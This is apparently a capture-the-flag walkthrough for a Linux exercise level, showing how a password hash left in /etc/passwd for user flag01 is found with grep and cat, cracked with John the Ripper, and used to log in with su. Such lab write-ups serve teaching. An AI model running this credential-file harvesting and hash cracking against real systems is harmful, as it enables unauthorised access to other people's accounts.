```sh
find / -user flag01 | less
# permission denied on all files
```

**grep flag01 on different critical directory**

```sh
$: grep flag01 /etc/* -s
/etc/group:flag:x:1001:flag00,flag01,flag02,flag03,flag04,flag05,flag06,flag07,flag08,flag09,flag10,flag11,flag12,flag13,flag14
/etc/group:flag01:x:3001:
/etc/passwd:flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

**/etc/passwd got something special**

**/etc/passwd is a configuration file which stores user account information**

```sh
$: cat /etc/passwd
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
flag05:x:3005:3005::/home/flag/flag05:/bin/bash
flag06:x:3006:3006::/home/flag/flag06:/bin/bash
flag07:x:3007:3007::/home/flag/flag07:/bin/bash
flag08:x:3008:3008::/home/flag/flag08:/bin/bash
flag09:x:3009:3009::/home/flag/flag09:/bin/bash
flag10:x:3010:3010::/home/flag/flag10:/bin/bash
flag11:x:3011:3011::/home/flag/flag11:/bin/bash
flag12:x:3012:3012::/home/flag/flag12:/bin/bash
flag13:x:3013:3013::/home/flag/flag13:/bin/bash
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
```

**You can see many different symbols that are in this field, if you see an "x" that means the password is stored in the /etc/shadow file,**
**a "\*" means the user doesn't have login access**
**and if there is a blank field that means the user doesn't have a password**

**flag01 doesn't have x symbol so his password is not stored in /etc/shadow but directly in etc/passwd**
**however the password is still encrypted**

SOURCE: https://serverfault.com/questions/116281/in-linux-debian-did-the-passwords-etc-passwd-ever-been-stored-as-plain-text

```sh
./john passwd              # Using john the reaper to crack the password

abcdefg
```

log in flag01 user with the decrypted password : su flag01

then use getflag command to get the token for level02
